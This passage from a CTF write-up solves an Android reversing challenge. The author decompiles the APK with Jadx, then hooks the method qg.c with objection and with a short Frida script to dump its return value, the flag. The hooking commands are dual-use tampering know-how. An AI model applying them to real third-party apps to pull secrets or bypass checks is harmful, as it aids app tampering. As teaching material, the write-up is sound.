<p>Now we have our environment set up, we can now proceed with source code analysis</p>
<p>Viewing source code by Jadx.</p>
<p><img src="/images/hackpack2022/Pasted%20image%2020220412001138.png" alt=""></p>
<p>This is the main function of the android app. On line 38 we can see the apk calling a method <code>c</code> of the class <code>qg</code> (since qgVar is object of qg). Let&rsquo;s inspect this method.</p>
<p><img src="/images/hackpack2022/Pasted%20image%2020220412002648.png" alt=""></p>
<p>The method <code>c</code> returns some string value, we can hook this method and see it&rsquo;s return value. This will give us the flag most probably.</p>
<p>So to do this, there are two ways</p>
<h3 id="the-skiddie-way--using-objection">The Skiddie Way : Using Objection</h3>
<p>Using <a href="https://github.com/sensepost/objection">objection</a> we can check for classes and find the return value for the same.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>objection -g com.hackpack.et explore
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>android hooking watch class_method qg.c --dump-return
</code></pre></div><p>Now entering any text inside the textbox will call the function and give us the flag</p>
<p><img src="/images/hackpack2022/Pasted%20image%2020220412003202.png" alt=""></p>
<h3 id="pro-way-manual-function-override-using-frida">Pro Way: Manual function override using frida.</h3>
<p>We know which class we have to hook, so creating a custom frida script for the same</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>Java.perform(<span style="color:#8be9fd;font-style:italic">function</span>(){
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span>  Java.use(<span style="color:#f1fa8c">&#34;qg&#34;</span>).c.implementation <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">function</span> (a , b) {
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span>    console.log(<span style="color:#f1fa8c">&#34;Exploit Loaded&#34;</span>);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span>    <span style="color:#8be9fd;font-style:italic">var</span> retVal <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">this</span>.c(a , b);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span>    console.log(retVal);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span>    <span style="color:#ff79c6">return</span> retVal;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span>  }
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span>});
</code></pre></div><p>The above scripts overloads the function <code>qg.c</code> and then prints it&rsquo;s return value.</p>
<p>Now running this on frida</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>frida -U -j exploit.js com.hackpack.et --no-pause
</code></pre></div><p>Again entering text on the text box will print the flag for the challenge</p>
<p><img src="/images/hackpack2022/Pasted%20image%2020220412002311.png" alt=""></p>
<hr>
<h2 id="conclusion">Conclusion</h2>
<p>I hope you all learned something from this writeup. If you feel that this could be improved, feel free to <a href="mailto:sec.ev1lm0rty@gmail.com">mail me</a>.
Thankyou HackPack team for this wonderful CTF.</p>

    </div>
  </article>

  
  






  <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/posts">Posts</a></li>
         
          <li><a href="/tags">Tags</a></li>
        
      </ul>
    </div>

    
    <div id="toc-footer" style="display: none">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#about">About</a></li>
    <li><a href="#web--imported-kimichi">Web:  Imported Kimichi</a></li>
    <li><a href="#2-web-tuplecoin">2. Web TupleCoin</a></li>
    <li><a href="#rev-3t-3nd-ur-hom3">Rev: 3T 3ND UR HOM3</a>
      <ul>
        <li><a href="#the-skiddie-way--using-objection">The Skiddie Way : Using Objection</a></li>
        <li><a href="#pro-way-manual-function-override-using-frida">Pro Way: Manual function override using frida.</a></li>
      </ul>
    </li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ul>
</nav>
    </div>
    

    <div id="share-footer" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fev1lm0rty.com%2fposts%2fwriteup-hackpack-2022%2f" aria-label="Facebook">
      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fev1lm0rty.com%2fposts%2fwriteup-hackpack-2022%2f&text=Writeup%3a%20HackPackCTF-2022" aria-label="Twitter">
      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fev1lm0rty.com%2fposts%2fwriteup-hackpack-2022%2f&title=Writeup%3a%20HackPackCTF-2022" aria-label="Linkedin">
      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fev1lm0rty.com%2fposts%2fwriteup-hackpack-2022%2f&is_video=false&description=Writeup%3a%20HackPackCTF-2022" aria-label="Pinterest">
      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=Writeup%3a%20HackPackCTF-2022&body=Check out this article: https%3a%2f%2fev1lm0rty.com%2fposts%2fwriteup-hackpack-2022%2f" aria-label="Email">
      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fev1lm0rty.com%2fposts%2fwriteup-hackpack-2022%2f&title=Writeup%3a%20HackPackCTF-2022" aria-label="Pocket">
      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fev1lm0rty.com%2fposts%2fwriteup-hackpack-2022%2f&title=Writeup%3a%20HackPackCTF-2022" aria-label="reddit">
      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fev1lm0rty.com%2fposts%2fwriteup-hackpack-2022%2f&name=Writeup%3a%20HackPackCTF-2022&description=About%20Hello%20readers%2c%20I%20have%20regularly%20started%20playing%20CTFs%20on%20the%20weekends%20again.%20I%20hope%20this%20time%20that%20I%26rsquo%3bll%20be%20regular.%0aLast%20weekend%20I%20played%20the%20HackPack2022%20CTF.%20It%20was%20a%20really%20fun%20CTF%20and%20I%20learned%20a%20lot%20of%20things.%0aOut%20of%20all%20the%20challenges%20solved%2c%20I%20am%20posting%20the%20writeups%20of%20the%20most%20interesting%20ones.%20Enjoy%20%21%0aWeb%3a%20Imported%20Kimichi%20This%20challenge%20highlighted%20%26ldquo%3binsecure%20unpickling%26rdquo%3b%20bug%20.%20The%20challenge%20gave%20us%20a%20website%20which%20we%20can%20use%20for%20image%20upload%20and%20later%20viewing." aria-label="Tumblr">
      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fev1lm0rty.com%2fposts%2fwriteup-hackpack-2022%2f&t=Writeup%3a%20HackPackCTF-2022" aria-label="Hacker News">
      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>

    <div id="actions-footer">
      
        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>


  <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2022  Shubham Arya 
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/posts">Posts</a></li>
         
        <li><a href="/tags">Tags</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
</body>

<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>

<script src=/js/code-copy.js></script>




</html>
